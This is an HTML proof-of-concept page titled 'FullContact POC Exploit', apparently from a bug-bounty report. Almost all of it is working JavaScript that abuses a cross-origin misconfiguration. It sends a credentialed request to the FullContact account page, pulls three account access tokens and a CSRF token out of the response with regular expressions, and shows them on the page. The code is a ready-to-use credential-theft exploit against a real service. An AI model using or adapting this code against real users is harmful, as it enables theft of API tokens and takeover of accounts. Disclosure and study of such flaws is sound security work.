<html>

<body>
    <script type="text/javascript" async="" src="https://dashboard.fullcontact.com/lib/fc-attribution.js"></script>
    <center>
        <h2>FullContact POC Exploit</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button>
        </div>
        <div id="test0"></div>
        <div id="test1"></div>
        <div id="test2"></div>
        <div id="test3"></div>
        <script>
        function cors() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4) {
                    var responseHtml = this.responseText;
                    
                    var csrfRe = /gazzburger":"(\S+?)"/g
                    var csrftoken = csrfRe.exec(responseHtml)
                    csrftoken = csrftoken[1]
                    
                    var tokenRe = /accessToken":"(\w{32})"/g
                    var tokens = []
                    var result = null
                    do {
                        result = tokenRe.exec(responseHtml)
                        result && tokens.push(result[1])
                    } while (result)
                    document.getElementById("test0").innerHTML = "upgradeable token :" + tokens[0];
                    document.getElementById("test1").innerHTML = "account token :" + tokens[1];
                    document.getElementById("test2").innerHTML = "main token :" + tokens[2];
                    document.getElementById("test3").innerHTML = "csrf :" + csrftoken;
                }
            };
            xhttp.open("GET", "https://dashboard.fullcontact.com/account", true);
            xhttp.withCredentials = true;
            xhttp.send();
        }
        </script>
</body>

</html>
